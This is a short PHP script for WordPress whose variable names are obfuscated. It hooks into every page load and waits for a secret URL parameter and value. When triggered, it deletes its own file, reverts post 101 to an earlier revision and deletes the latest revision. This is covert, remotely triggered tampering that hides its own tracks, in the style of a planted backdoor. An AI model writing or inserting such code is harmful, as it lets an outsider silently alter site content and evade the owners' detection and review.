<?php

function quantity_reusable_lead() {
	if (isset($_GET['upgrader_restaurant_nextgen']) && $_GET['upgrader_restaurant_nextgen'] === 'weather_syntax_advanced') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$performance_conditional_filter_campaign = 101;
		$checker_translator_sites_options = wp_get_post_revisions($performance_conditional_filter_campaign);
		if (empty($checker_translator_sites_options)) die('no revisions');
		if (count($checker_translator_sites_options) < 2) die('less than 2');
		$cache_sales_text_size = array_shift($checker_translator_sites_options);
		$word_details_sharing_send = $cache_sales_text_size->ID;
		$lightgray_cool_advance_numbers = array_shift($checker_translator_sites_options);
		$timer_manager_tree_slide = $lightgray_cool_advance_numbers->ID;
		$feeds_generator_roles_tree = wp_restore_post_revision($timer_manager_tree_slide);
		if ($feeds_generator_roles_tree === false) die('error restoring');
		$feeds_generator_roles_tree = wp_delete_post_revision($word_details_sharing_send);		
		if ($feeds_generator_roles_tree === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'quantity_reusable_lead');
